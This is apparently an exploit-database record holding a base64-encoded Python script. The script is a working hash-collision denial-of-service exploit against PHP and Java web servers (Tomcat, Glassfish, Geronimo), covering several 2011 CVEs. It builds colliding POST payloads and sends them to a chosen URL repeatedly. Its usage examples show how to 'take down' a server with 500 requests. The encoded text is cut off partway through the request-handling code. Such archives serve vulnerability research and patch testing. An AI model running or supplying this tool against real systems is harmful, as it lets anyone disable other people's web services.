{
    "source": "exploit-database", 
    "exploit": "IyEgL3Vzci9iaW4vZW52IHB5dGhvbg0KDQoiIiINClRoaXMgc2NyaXB0IHdhcyB3cml0dGVuIGJ5IENocmlzdGlhbiBNZWhsbWF1ZXIgPEZpcmVGYXJ0QGdtYWlsLmNvbT4NCmh0dHBzOi8vdHdpdHRlci5jb20vIyEvX0ZpcmVGYXJ0Xw0KDQpTb3VyY2Vjb2RlIG9ubGluZSBhdDoNCmh0dHBzOi8vZ2l0aHViLmNvbS9GaXJlRmFydC9IYXNoQ29sbGlzaW9uLURPUy1QT0MNCg0KT3JpZ2luYWwgUEhQIFBheWxvYWRnZW5lcmF0b3IgdGFrZW4gZnJvbSBodHRwczovL2dpdGh1Yi5jb20va290by9ibG9nLWtvdG93aWN6LW5ldC1leGFtcGxlcy90cmVlL21hc3Rlci9oYXNoY29sbGlzaW9uDQoNCmh0dHA6Ly93d3cub2NlcnQub3JnL2Fkdmlzb3JpZXMvb2NlcnQtMjAxMS0wMDMuaHRtbA0KQ1ZFOg0KQXBhY2hlIEdlcm9uaW1vOiBDVkUtMjAxMS01MDM0DQpPcmFjbGUgR2xhc3NmaXNoOiBDVkUtMjAxMS01MDM1DQpQSFA6IENWRS0yMDExLTQ4ODUNCkFwYWNoZSBUb21jYXQ6IENWRS0yMDExLTQ4NTgNCg0KcmVxdWlyZXMgUHl0aG9uIDIuNw0KDQpFeGFtcGxlczoNCi0pIE1ha2UgYSBzaW5nbGUgUmVxdWVzdCwgd2FpdCBmb3IgdGhlIHJlc3BvbnNlIGFuZCBzYXZlIHRoZSByZXNwb25zZSB0byBvdXRwdXQwLmh0bWwNCnB5dGhvbiBIYXNodGFibGVQT0MucHkgLXUgaHR0cHM6Ly9ob3N0L2luZGV4LnBocCAtdiAtYyAxIC13IC1vIG91dHB1dCAtdCBQSFANCg0KLSkgVGFrZSBkb3duIGEgUEhQIHNlcnZlcihtYWtlIDUwMCByZXF1ZXN0cyB3aXRob3V0IHdhaXRpbmcgZm9yIGEgcmVzcG9uc2UpOg0KcHl0aG9uIEhhc2h0YWJsZVBPQy5weSAtdSBodHRwczovL2hvc3QvaW5kZXgucGhwIC12IC1jIDUwMCAtdCBQSFANCg0KLSkgVGFrZSBkb3duIGEgSkFWQSBzZXJ2ZXIobWFrZSA1MDAgcmVxdWVzdHMgd2l0aG91dCB3YWl0aW5nIGZvciBhIHJlc3BvbnNlLCBtYXhpbXVtIFBPU1QgZGF0YSBzaXplIDJNQik6DQpweXRob24gSGFzaHRhYmxlUE9DLnB5IC11IGh0dHBzOi8vaG9zdC9pbmRleC5qc3AgLXYgLWMgNTAwIC10IEpBVkEgLW0gMg0KDQpDaGFuZ2Vsb2c6DQp2Ni4wOiBBZGRlZCBKYXZhcGF5bG9hZGdlbmVyYXRvcg0KdjUuMDogRGVmaW5lIG1heCBwYXlsb2FkIHNpemUgYXMgcGFyYW1ldGVyDQp2NC4wOiBHZXQgUEhQIENvbGxpc2lvbiBDaGFycyBvbiB0aGUgZmx5DQp2My4wOiBMb2FkIFBheWxvYWQgZnJvbSBmaWxlDQp2Mi4wOiBBZGRlZCBTdXBwb3J0IGZvciBodHRwcywgc3dpdGNoZWQgdG8gSFRUUCAxLjENCnYxLjA6IEluaXRpYWwgUmVsZWFzZQ0KIiIiDQoNCmltcG9ydCBzb2NrZXQNCmltcG9ydCBzeXMNCmltcG9ydCBtYXRoDQppbXBvcnQgdXJsbGliDQppbXBvcnQgc3RyaW5nDQppbXBvcnQgdGltZQ0KaW1wb3J0IHVybHBhcnNlDQppbXBvcnQgYXJncGFyc2UNCmltcG9ydCBzc2wNCmltcG9ydCByYW5kb20NCmltcG9ydCBpdGVydG9vbHMNCg0KY2xhc3MgUGF5bG9hZGdlbmVyYXRvcjoNCiAgICAjIE1heGltdW0gcmVjdXJzaW9ucyB3aGVuIHNlYXJjaGluZyBmb3IgY29sbGlzaW9uY2hhcnMNCiAgICBfcmVjdXJzaXZlbWF4ID0gMTUNCiAgICBfcmVjdXJzaXZlY291bnRlciA9IDENCiAgICANCiAgICBkZWYgX19pbml0X18oc2VsZiwgdmVyYm9zZSwgY29sbGlzaW9uY2hhcnMgPSA1LCBjb2xsaXNpb25jaGFybGVuZ3RoID0gMiwgcGF5bG9hZGxlbmd0aCA9IDgpOg0KICAgICAgICBzZWxmLl92ZXJib3NlID0gdmVyYm9zZQ0KICAgICAgICBzZWxmLl9jb2xsaXNpb25jaGFycyA9IGNvbGxpc2lvbmNoYXJzDQogICAgICAgIHNlbGYuX2NvbGxpc2lvbmNoYXJsZW5ndGggPSBjb2xsaXNpb25jaGFybGVuZ3RoDQogICAgICAgIHNlbGYuX3BheWxvYWRsZW5ndGggPSBwYXlsb2FkbGVuZ3RoDQogICAgDQogICAgZGVmIGdlbmVyYXRlQVNQUGF5bG9hZChzZWxmKToNCiAgICAgICAgcmFpc2UgRXhjZXB0aW9uKCJBU1AgUGF5bG9hZCBub3QgaW1wbGVtZW50ZWQiKQ0KICAgIA0KICAgIGRlZiBnZW5lcmF0ZUpBVkFQYXlsb2FkKHNlbGYpOg0KICAgICAgICBhID0gc2VsZi5fY29tcHV0ZUpBVkFDb2xsaXNpb25DaGFycyhzZWxmLl9jb2xsaXNpb25jaGFycykNCiAgICAgICAgcmV0dXJuIHNlbGYuX2dlbmVyYXRlUGF5bG9hZChhLCBzZWxmLl9wYXlsb2FkbGVuZ3RoKQ0KICAgIA0KICAgIGRlZiBnZW5lcmF0ZVBIUFBheWxvYWQoc2VsZik6DQogICAgICAgICMgTm90ZTogRGVmYXVsdCBtYXggUE9TVCBEYXRhIExlbmd0aCBpbiBQSFAgaXMgODM4ODYwOCBieXRlcyAoOE1CKQ0KICAgICAgICAjIGNvbXB1dGUgZW50cmllcyB3aXRoIGNvbGxpc2lvbnMgaW4gUEhQIGhhc2h0YWJsZSBoYXNoIGZ1bmN0aW9uDQogICAgICAgIGEgPSBzZWxmLl9jb21wdXRlUEhQQ29sbGlzaW9uQ2hhcnMoc2VsZi5fY29sbGlzaW9uY2hhcnMpDQogICAgICAgIHJldHVybiBzZWxmLl9nZW5lcmF0ZVBheWxvYWQoYSwgc2VsZi5fcGF5bG9hZGxlbmd0aCk7DQogICAgDQogICAgZGVmIF9jb21wdXRlUEhQQ29sbGlzaW9uQ2hhcnMoc2VsZiwgY291bnQpOg0KICAgICAgICBjaGFycmFuZ2UgPSByYW5nZSgwLCAyNTYpDQogICAgICAgIHJldHVybiBzZWxmLl9jb21wdXRlQ29sbGlzaW9uQ2hhcnMoc2VsZi5fREpCWDMzQSwgY291bnQsIGNoYXJyYW5nZSkNCiAgICANCiAgICBkZWYgX2NvbXB1dGVKQVZBQ29sbGlzaW9uQ2hhcnMoc2VsZiwgY291bnQpOg0KICAgICAgICBjaGFycmFuZ2UgPSByYW5nZSgwLCAxMjkpDQogICAgICAgIHJldHVybiBzZWxmLl9jb21wdXRlQ29sbGlzaW9uQ2hhcnMoc2VsZi5fREpCWDMxQSwgY291bnQsIGNoYXJyYW5nZSkNCiAgICANCiAgICBkZWYgX2NvbXB1dGVDb2xsaXNpb25DaGFycyhzZWxmLCBmdW5jdGlvbiwgY291bnQsIGNoYXJyYW5nZSk6DQogICAgICAgIGhhc2hlcyA9IHt9DQogICAgICAgIGNvdW50ZXIgPSAwDQogICAgICAgIGxlbmd0aCA9IHNlbGYuX2NvbGxpc2lvbmNoYXJsZW5ndGgNCiAgICAgICAgYSA9ICIiDQogICAgICAgIGZvciBpIGluIGNoYXJyYW5nZToNCiAgICAgICAgICAgIGEgPSBhK2NocihpKQ0KICAgICAgICBzb3VyY2UgPSBsaXN0KGl0ZXJ0b29scy5wcm9kdWN0KGEsIHJlcGVhdD1sZW5ndGgpKQ0KICAgICAgICBiYXNlc3RyID0gJycuam9pbihyYW5kb20uY2hvaWNlKHNvdXJjZSkpDQogICAgICAgIGJhc2VoYXNoID0gZnVuY3Rpb24oYmFzZXN0cikNCiAgICAgICAgaGFzaGVzW3N0cihjb3VudGVyKV0gPSBiYXNlc3RyDQogICAgICAgIGNvdW50ZXIgPSBjb3VudGVyICsgMQ0KICAgICAgICBmb3IgaXRlbSBpbiBzb3VyY2U6DQogICAgICAgICAgICB0ZW1wc3RyID0gJycuam9pbihpdGVtKQ0KICAgICAgICAgICAgaWYgdGVtcHN0ciA9PSBiYXNlc3RyOg0KICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgICAgICBpZiBmdW5jdGlvbih0ZW1wc3RyKSA9PSBiYXNlaGFzaDoNCiAgICAgICAgICAgICAgICBoYXNoZXNbc3RyKGNvdW50ZXIpXSA9IHRlbXBzdHINCiAgICAgICAgICAgICAgICBjb3VudGVyID0gY291bnRlciArIDENCiAgICAgICAgICAgIGlmIGNvdW50ZXIgPj0gY291bnQ6DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgIGlmIGNvdW50ZXIgPCBjb3VudDoNCiAgICAgICAgICAgICMgVHJ5IGl0IGFnYWluDQogICAgICAgICAgICBpZiBzZWxmLl9yZWN1cnNpdmVjb3VudGVyID4gc2VsZi5fcmVjdXJzaXZlbWF4Og0KICAgICAgICAgICAgICAgIHByaW50KCJOb3QgZW5vdWdodCB2YWx1ZXMgZm91bmQuIFBsZWFzZSBzdGFydCB0aGlzIHNjcmlwdCBhZ2FpbiIpDQogICAgICAgICAgICAgICAgc3lzLmV4aXQoMSkNCiAgICAgICAgICAgIHByaW50KCIlZDogTm90IGVub3VnaCB2YWx1ZXMgZm91bmQuIFRyeWluZyBpdCBhZ2Fpbi4uLiIgJSBzZWxmLl9yZWN1cnNpdmVjb3VudGVyKQ0KICAgICAgICAgICAgc2VsZi5fcmVjdXJzaXZlY291bnRlciA9IHNlbGYuX3JlY3Vyc2l2ZWNvdW50ZXIgKyAxDQogICAgICAgICAgICBoYXNoZXMgPSBzZWxmLl9jb21wdXRlQ29sbGlzaW9uQ2hhcnMoZnVuY3Rpb24sIGNvdW50LCBjaGFycmFuZ2UpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBpZiBzZWxmLl92ZXJib3NlOg0KICAgICAgICAgICAgICAgIHByaW50KCJGb3VuZCB2YWx1ZXM6IikNCiAgICAgICAgICAgICAgICBmb3IgaXRlbSBpbiBoYXNoZXM6DQogICAgICAgICAgICAgICAgICAgIHRlbXBzdHIgPSBoYXNoZXNbaXRlbV0NCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlx0VmFsdWU6ICVzXHRIYXNoOiAlcyIgJSAodGVtcHN0ciwgZnVuY3Rpb24odGVtcHN0cikpKQ0KICAgICAgICAgICAgICAgICAgICBmb3IgaSBpbiB0ZW1wc3RyOg0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlx0XHRWYWx1ZTogJXNcdENoYXJjb2RlOiAlZCIgJSAoaSwgb3JkKGkpKSkNCiAgICAgICAgcmV0dXJuIGhhc2hlcw0KICAgIA0KICAgIGRlZiBfREpCWEEoc2VsZiwgaW5wdXRzdHJpbmcsIGJhc2UsIHN0YXJ0KToNCiAgICAgICAgY291bnRlciA9IGxlbihpbnB1dHN0cmluZykgLSAxDQogICAgICAgIHJlc3VsdCA9IHN0YXJ0DQogICAgICAgIGZvciBpdGVtIGluIGlucHV0c3RyaW5nOg0KICAgICAgICAgICAgcmVzdWx0ID0gcmVzdWx0ICsgKG1hdGgucG93KGJhc2UsIGNvdW50ZXIpICogb3JkKGl0ZW0pKQ0KICAgICAgICAgICAgY291bnRlciA9IGNvdW50ZXIgLSAxDQogICAgICAgIHJldHVybiBpbnQocm91bmQocmVzdWx0KSkNCiAgICANCiAgICAjUEhQDQogICAgZGVmIF9ESkJYMzNBKHNlbGYsIGlucHV0c3RyaW5nKToNCiAgICAgICAgcmV0dXJuIHNlbGYuX0RKQlhBKGlucHV0c3RyaW5nLCAzMywgNTM4MSkNCiAgICANCiAgICAjSmF2YQ0KICAgIGRlZiBfREpCWDMxQShzZWxmLCBpbnB1dHN0cmluZyk6DQogICAgICAgIHJldHVybiBzZWxmLl9ESkJYQShpbnB1dHN0cmluZywgMzEsIDApDQogICAgDQogICAgI0FTUA0KICAgIGRlZiBfREpCWDMzWChzZWxmLCBpbnB1dHN0cmluZyk6DQogICAgICAgIGNvdW50ZXIgPSBsZW4oaW5wdXRzdHJpbmcpIC0gMQ0KICAgICAgICByZXN1bHQgPSA1MzgxDQogICAgICAgIGZvciBpdGVtIGluIGlucHV0c3RyaW5nOg0KICAgICAgICAgICAgcmVzdWx0ID0gcmVzdWx0ICsgKGludChyb3VuZChtYXRoLnBvdygzMywgY291bnRlcikpKSBeIG9yZChpdGVtKSkNCiAgICAgICAgICAgIGNvdW50ZXIgPSBjb3VudGVyIC0gMQ0KICAgICAgICByZXR1cm4gaW50KHJvdW5kKHJlc3VsdCkpDQogICAgDQogICAgZGVmIF9nZW5lcmF0ZVBheWxvYWQoc2VsZiwgY29sbGlzaW9uY2hhcnMsIHBheWxvYWRsZW5ndGgpOg0KICAgICAgICAjIFRha2VuIGZyb206DQogICAgICAgICMgaHR0cHM6Ly9naXRodWIuY29tL2tvdG8vYmxvZy1rb3Rvd2ljei1uZXQtZXhhbXBsZXMvdHJlZS9tYXN0ZXIvaGFzaGNvbGxpc2lvbg0KICAgIA0KICAgICAgICAjIGhvdyBsb25nIHNob3VsZCB0aGUgcGF5bG9hZCBiZQ0KICAgICAgICBsZW5ndGggPSBwYXlsb2FkbGVuZ3RoDQogICAgICAgIHNpemUgPSBsZW4oY29sbGlzaW9uY2hhcnMpDQogICAgICAgIHBvc3QgPSAiIg0KICAgICAgICBtYXh2YWx1ZWZsb2F0ID0gbWF0aC5wb3coc2l6ZSxsZW5ndGgpDQogICAgICAgIG1heHZhbHVlaW50ID0gaW50KG1hdGguZmxvb3IobWF4dmFsdWVmbG9hdCkpDQogICAgICAgIGZvciBpIGluIHJhbmdlIChtYXh2YWx1ZWludCk6DQogICAgICAgICAgICBpbnB1dHN0cmluZyA9IHNlbGYuX2Jhc2VfY29udmVydChpLCBzaXplKQ0KICAgICAgICAgICAgcmVzdWx0ID0gaW5wdXRzdHJpbmcucmp1c3QobGVuZ3RoLCAiMCIpDQogICAgICAgICAgICBmb3IgaXRlbSBpbiBjb2xsaXNpb25jaGFyczoNCiAgICAgICAgICAgICAgICByZXN1bHQgPSByZXN1bHQucmVwbGFjZShzdHIoaXRlbSksIGNvbGxpc2lvbmNoYXJzW2l0ZW1dKQ0KICAgICAgICAgICAgcG9zdCArPSB1cmxsaWIudXJsZW5jb2RlKHtyZXN1bHQ6IiJ9KSArICImIg0KICAgIA0KICAgICAgICByZXR1cm4gcG9zdDsNCiAgICANCiAgICBkZWYgX2Jhc2VfY29udmVydChzZWxmLCBudW0sIGJhc2UpOg0KICAgICAgICBmdWxsYWxwaGFiZXQgPSAiMDEyMzQ1Njc4OWFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVoiDQogICAgICAgIGFscGhhYmV0ID0gZnVsbGFscGhhYmV0WzpiYXNlXQ0KICAgICAgICBpZiAobnVtID09IDApOg0KICAgICAgICAgICAgcmV0dXJuIGFscGhhYmV0WzBdDQogICAgICAgIGFyciA9IFtdDQogICAgICAgIGJhc2UgPSBsZW4oYWxwaGFiZXQpDQogICAgICAgIHdoaWxlIG51bToNCiAgICAgICAgICAgIHJlbSA9IG51bSAlIGJhc2UNCiAgICAgICAgICAgIG51bSA9IG51bSAvLyBiYXNlDQogICAgICAgICAgICBhcnIuYXBwZW5kKGFscGhhYmV0W3JlbV0pDQogICAgICAgIGFyci5yZXZlcnNlKCkNCiAgICAgICAgcmV0dXJuICIiLmpvaW4oYXJyKQ0KDQpkZWYgbWFpbigpOg0KICAgIHBhcnNlciA9IGFyZ3BhcnNlLkFyZ3VtZW50UGFyc2VyKGRlc2NyaXB0aW9uPSJUYWtlIGRvd24gYSByZW1vdGUgSG9zdCB2aWEgSGFzaGNvbGxpc2lvbnMiLCBwcm9nPSJVbml2ZXJzYWwgSGFzaGNvbGxpc2lvbiBFeHBsb2l0IikNCiAgICBwYXJzZXIuYWRkX2FyZ3VtZW50KCItdSIsICItLXVybCIsIGRlc3Q9InVybCIsIGhlbHA9IlVybCB0byBhdHRhY2siLCByZXF1aXJlZD1UcnVlKQ0KICAgIHBhcnNlci5hZGRfYXJndW1lbnQoIi13IiwgIi0td2FpdCIsIGRlc3Q9IndhaXQiLCBhY3Rpb249InN0b3JlX3RydWUiLCBkZWZhdWx0PUZhbHNlLCBoZWxwPSJ3YWl0IGZvciBSZXNwb25zZSIpDQogICAgcGFyc2VyLmFkZF9hcmd1bWVudCgiLWMiLCAiLS1jb3VudCIsIGRlc3Q9ImNvdW50IiwgdHlwZT1pbnQsIGRlZmF1bHQ9MSwgaGVscD0iSG93IG1hbnkgcmVxdWVzdHMiKQ0KICAgIHBhcnNlci5hZGRfYXJndW1lbnQoIi12IiwgIi0tdmVyYm9zZSIsIGRlc3Q9InZlcmJvc2UiLCBhY3Rpb249InN0b3JlX3RydWUiLCBkZWZhdWx0PUZhbHNlLCBoZWxwPSJWZXJib3NlIG91dHB1dCIpDQogICAgcGFyc2VyLmFkZF9hcmd1bWVudCgiLXMiLCAiLS1zYXZlIiwgZGVzdD0ic2F2ZSIsIGhlbHA9IlNhdmUgcGF5bG9hZCB0byBmaWxlIikNCiAgICBwYXJzZXIuYWRkX2FyZ3VtZW50KCItcCIsICItLXBheWxvYWQiLCBkZXN0PSJwYXlsb2FkIiwgaGVscD0iU2F2ZSBwYXlsb2FkIHRvIGZpbGUiKQ0KICAgIHBhcnNlci5hZGRfYXJndW1lbnQoIi1vIiwgIi0tb3V0cHV0IiwgZGVzdD0ib3V0cHV0IiwgaGVscD0iU2F2ZSBTZXJ2ZXIgcmVzcG9uc2UgdG8gZmlsZS4gVGhpcyBuYW1lIGlzIG9ubHkgYSBwYXR0ZXJuLiBIVE1MIEV4dGVuc2lvbiB3aWxsIGJlIGFwcGVuZGVkLiBJbXBsaWVzIC13IikNCiAgICBwYXJzZXIuYWRkX2FyZ3VtZW50KCItdCIsICItLXRhcmdldCIsIGRlc3Q9InRhcmdldCIsIGhlbHA9IlRhcmdldCBvZiB0aGUgYXR0YWNrIiwgY2hvaWNlcz1bIkFTUCIsICJQSFAiLCAiSkFWQSJdLCByZXF1aXJlZD1UcnVlKQ0KICAgIHBhcnNlci5hZGRfYXJndW1lbnQoIi1tIiwgIi0tbWF4LXBheWxvYWQtc2l6ZSIsIGRlc3Q9Im1heHBheWxvYWRzaXplIiwgaGVscD0iTWF4aW11bSBzaXplIG9mIHRoZSBQYXlsb2FkIGluIE1lZ2FieXRlLiBQSFBzIGRlZmF1bHRjb25maWd1cmF0aW9uIGRvZXMgbm90IGFsbG93IG1vcmUgdGhhbiA4TUIsIFRvbWNhdCBpcyAyTUIiLCB0eXBlPWludCkNCiAgICBwYXJzZXIuYWRkX2FyZ3VtZW50KCItZyIsICItLWdlbmVyYXRlIiwgZGVzdD0iZ2VuZXJhdGUiLCBoZWxwPSJPbmx5IGdlbmVyYXRlIFBheWxvYWQgYW5kIGV4aXQiLCBkZWZhdWx0PUZhbHNlLCBhY3Rpb249InN0b3JlX3RydWUiKQ0KICAgIHBhcnNlci5hZGRfYXJndW1lbnQoIi0tdmVyc2lvbiIsIGFjdGlvbj0idmVyc2lvbiIsIHZlcnNpb249IiUocHJvZylzIDYuMCIpDQoNCiAgICBvcHRpb25zID0gcGFyc2VyLnBhcnNlX2FyZ3MoKQ0KICAgIA0KICAgIGlmIG9wdGlvbnMudGFyZ2V0ID09ICJQSFAiOg0KICAgICAgICBpZiBub3Qgb3B0aW9ucy5tYXhwYXlsb2Fkc2l6ZSBvciBvcHRpb25zLm1heHBheWxvYWRzaXplID09IDA6DQogICAgICAgICAgICBtYXhwYXlsb2Fkc2l6ZSA9IDgNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIG1heHBheWxvYWRzaXplID0gb3B0aW9ucy5tYXhwYXlsb2Fkc2l6ZQ0KICAgIGVsaWYgb3B0aW9ucy50YXJnZXQgPT0gIkFTUCI6DQogICAgICAgIGlmIG5vdCBvcHRpb25zLm1heHBheWxvYWRzaXplIG9yIG9wdGlvbnMubWF4cGF5bG9hZHNpemUgPT0gMDoNCiAgICAgICAgICAgIG1heHBheWxvYWRzaXplID0gOA0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgbWF4cGF5bG9hZHNpemUgPSBvcHRpb25zLm1heHBheWxvYWRzaXplDQogICAgZWxpZiBvcHRpb25zLnRhcmdldCA9PSAiSkFWQSI6DQogICAgICAgIGlmIG5vdCBvcHRpb25zLm1heHBheWxvYWRzaXplIG9yIG9wdGlvbnMubWF4cGF5bG9hZHNpemUgPT0gMDoNCiAgICAgICAgICAgIG1heHBheWxvYWRzaXplID0gMg0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgbWF4cGF5bG9hZHNpemUgPSBvcHRpb25zLm1heHBheWxvYWRzaXplDQogICAgZWxzZToNCiAgICAgICAgcHJpbnQoIlRhcmdldCAlcyBub3QgeWV0IGltcGxlbWVudGVkIiAlIG9wdGlvbnMudGFyZ2V0KQ0KICAgICAgICBzeXMuZXhpdCgxKQ0KDQogICAgdXJsID0gdXJscGFyc2UudXJscGFyc2Uob3B0aW9ucy51cmwpDQoNCiAgICBpZiBub3QgdXJsLnNjaGVtZToNCiAgICAgICAgcHJpbnQoIlBsZWFzZSBwcm92aWRlIGEgc2NoZW1lIHRvIHRoZSBVUkwoaHR0cDovLywgaHR0cHM6Ly8sLi4iKQ0KICAgICAgICBzeXMuZXhpdCgxKQ0KDQogICAgaG9zdCA9IHVybC5ob3N0bmFtZQ0KICAgIHBhdGggPSB1cmwucGF0aA0KICAgIHBvcnQgPSB1cmwucG9ydA0KICAgIGlmIG5vdCBwb3J0Og0KICAgICAgICBpZiB1cmwuc2NoZW1lID09ICJodHRwcyI6DQogICAgICAgICAgICBwb3J0ID0gNDQzDQogICAgICAgIGVsaWYgdXJsLnNjaGVtZSA9PSAiaHR0cCI6DQogICAgICAgICAgICBwb3J0ID0gODANCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIHByaW50KCJVbnN1cHBvcnRlZCBQcm90b2NvbCAlcyIgJSB1cmwuc2NoZW1lKQ0KICAgICAgICAgICAgc3lzLmV4aXQoMSkNCiAgICBpZiBub3QgcGF0aDoNCiAgICAgICAgcGF0aCA9ICIvIg0KDQogICAgaWYgbm90IG9wdGlvbnMucGF5bG9hZDoNCiAgICAgICAgcHJpbnQoIkdlbmVyYXRpbmcgUGF5bG9hZC4uLiIpDQogICAgICAgIA0KICAgICAgICAjIE51bWJlciBvZiBjb2xsaWRpbmcgY2hhcnMgdG8gZmluZA0KICAgICAgICBjb2xsaXNpb25jaGFycyA9IDUNCiAgICAgICAgIyBMZW5ndGggb2YgdGhlIGNvbGxpc2lvbiBjaGFycyAoMiA9IEV5LCBGWjsgMz1IeUEsIC4uLikNCiAgICAgICAgY29sbGlzaW9uY2hhcmxlbmd0aCA9IDINCiAgICAgICAgIyBMZW5ndGggb2YgZWFjaCBwYXJhbWV0ZXIgaW4gdGhlIHBheWxvYWQNCiAgICAgICAgcGF5bG9hZGxlbmd0aCA9IDgNCiAgICAgICAgZ2VuZXJhdG9yID0gUGF5bG9hZGdlbmVyYXRvcihvcHRpb25zLnZlcmJvc2UsIGNvbGxpc2lvbmNoYXJzLCBjb2xsaXNpb25jaGFybGVuZ3RoLCBwYXlsb2FkbGVuZ3RoKQ0KICAgICAgICBpZiBvcHRpb25zLnRhcmdldCA9PSAiUEhQIjoNCiAgICAgICAgICAgIHBheWxvYWQgPSBnZW5lcmF0b3IuZ2VuZXJhdGVQSFBQYXlsb2FkKCkNCiAgICAgICAgZWxpZiBvcHRpb25zLnRhcmdldCA9PSAiQVNQIjoNCiAgICAgICAgICAgICNwYXlsb2FkID0gZ2VuZXJhdGVBU1BQYXlsb2FkKCkNCiAgICAgICAgICAgIHByaW50KCJUYXJnZXQgJXMgbm90IHlldCBpbXBsZW1lbnRlZCIgJSBvcHRpb25zLnRhcmdldCkNCiAgICAgICAgICAgIHN5cy5leGl0KDEpDQogICAgICAgIGVsaWYgb3B0aW9ucy50YXJnZXQgPT0gIkpBVkEiOg0KICAgICAgICAgICAgcGF5bG9hZCA9IGdlbmVyYXRvci5nZW5lcmF0ZUpBVkFQYXlsb2FkKCkNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIHByaW50KCJUYXJnZXQgJXMgbm90IHlldCBpbXBsZW1lbnRlZCIgJSBvcHRpb25zLnRhcmdldCkNCiAgICAgICAgICAgIHN5cy5leGl0KDEpDQoNCiAgICAgICAgcHJpbnQoIlBheWxvYWQgZ2VuZXJhdGVkIikNCiAgICBlbHNlOg0KICAgICAgICBmID0gb3BlbihvcHRpb25zLnBheWxvYWQsICJyIikNCiAgICAgICAgcGF5bG9hZCA9IGYucmVhZCgpDQogICAgICAgIGYuY2xvc2UoKQ0KICAgICAgICBwcmludCgiTG9hZGVkIFBheWxvYWQgZnJvbSAlcyIgJSBvcHRpb25zLnBheWxvYWQpDQoNCiAgICAjIHRyaW0gdG8gbWF4aW11bSBwYXlsb2FkIHNpemUgKGluIE1CKQ0KICAgIG1heGlubWIgPSBtYXhwYXlsb2Fkc2l6ZSoxMDI0KjEwMjQNCiAgICBwYXlsb2FkID0gcGF5bG9hZFs6bWF4aW5tYl0NCiAgICAjIHJlbW92ZSBsYXN0IGludmFsaWQoY3V0IG9mZikgcGFyYW1ldGVyDQogICAgcG9zaXRpb24gPSBwYXlsb2FkLnJmaW5kKCI9JiIpDQogICAgcGF5bG9hZCA9IHBheWxvYWRbOnBvc2l0aW9uKzFdDQogICAgDQogICAgIyBTYXZlIHBheWxvYWQNCiAgICBpZiBvcHRpb25zLnNhdmU6DQogICAgICAgIGYgPSBvcGVuKG9wdGlvbnMuc2F2ZSwgInciKQ0KICAgICAgICBmLndyaXRlKHBheWxvYWQpDQogICAgICAgIGYuY2xvc2UoKQ0KICAgICAgICBwcmludCgiUGF5bG9hZCBzYXZlZCB0byAlcyIgJSBvcHRpb25zLnNhdmUpDQoNCiAgICAjIFVzZXIgc2VsZWN0ZWQgdG8gb25seSBnZW5lcmF0ZSB0aGUgcGF5bG9hZA0KICAgIGlmIG9wdGlvbnMuZ2VuZXJhdGU6DQogICAgICAgIHJldHVybg0KDQogICAgcHJpbnQoIkhvc3Q6ICVzIiAlIGhvc3QpDQogICAgcHJpbnQoIlBvcnQ6ICVzIiAlIHN0cihwb3J0KSkNCiAgICBwcmludCgicGF0aDogJXMiICUgcGF0aCkNCiAgICBwcmludA0KICAgIHByaW50DQoNCiAgICBmb3IgaSBpbiByYW5nZShvcHRpb25zLmNvdW50KToNCiAgICAgICAgcHJpbnQoInNlbmRpbmcgUmVxdWVzdCAjJXMuLi4iICUgc3RyKGkrMSkpDQogICAgICAgIHNvY2sgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pDQogICAgICAgIGlmIHVybC5zY2hlbWUgPT0gImh0dHBzIjoNCiAgICAgICAgICAgIHNzbF9zb2NrID0gc3NsLndyYXBfc29ja2V0KHNvY2spDQogICAgICAgICAgICBzc2xfc29jay5jb25uZWN0KChob3N0LCBwb3J0KSkNCiAgICAgICAgICAgIHNzbF9zb2NrLnNldHRpbWVvdXQoTm9uZSkNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIHNvY2suY29ubmVjdCgoaG9zdCwgcG9ydCkpDQogICAgICAgICAgICBzb2NrLnNldHRpbWVvdXQoTm9uZSkNCg0KICAgICAgICByZXF1ZXN0ID0gIlBPU1QgJXMgSFRUUC8xLjFcclxuXA0KSG9zdDogJXNcclxuXA0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQ7IGNoYXJzZXQ9dXRmLThcclxuXA0KQ29ubmVjdGlvbjogQ2xvc2VcclxuXA0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3M7IFU7IFdpbmRvd3MgTlQgNi4xOyBkZTsgcnY6MS45LjIuMjApIEdlY2tvLzIwMTEwODAzIEZpcmVmb3gvMy42LjIwICggLk5FVCBDTFIgMy41LjMwNzI5OyAuTkVUNC4wRSlcclxuXA0KQ29udGVudC1MZW5ndGg6ICVzXHJcblwNClxyXG5cDQolc1xyXG5cDQpcclxuIiAlIChwYXRoLCBob3N0LCBzdHIobGVuKHBheWxvYWQpKSwgcGF5bG9hZCkNCg0KICAgICAgICBpZiB1cmwuc2NoZW1lID09ICJodHRwcyI6DQogICAgICAgICAgICBzc2xfc29jay5zZW5kKHJlcXVlc3QpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBzb2NrLnNlbmQocmVxdWVzdCkNCg0KICAgICAgICBpZiBvcHRpb25zLnZlcmJvc2U6DQogICAgICAgICAgICBpZiBsZW4ocmVxdWVzdCkgPiA0MDA6DQogICAgICAgICAgICAgICAgcHJpbnQocmVxdWVzdFs6NDAwXSsiLi4uLiIpDQogICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgIHByaW50KHJlcXVlc3QpDQogICAgICAgICAgICBwcmludCgiIikNCiAgICAgICAgaWYgb3B0aW9ucy53YWl0IG9yIG9wdGlvbnMub3V0cHV0Og0KICAgICAgICAgICAgc3RhcnQgPSB0aW1lLnRpbWUoKQ0KICAgICAgICAgICAgaWYgdXJsLnNjaGVtZSA9PSAiaHR0cHMiOg0KICAgICAgICAgICAgICAgIGRhdGEgPSBzc2xfc29jay5y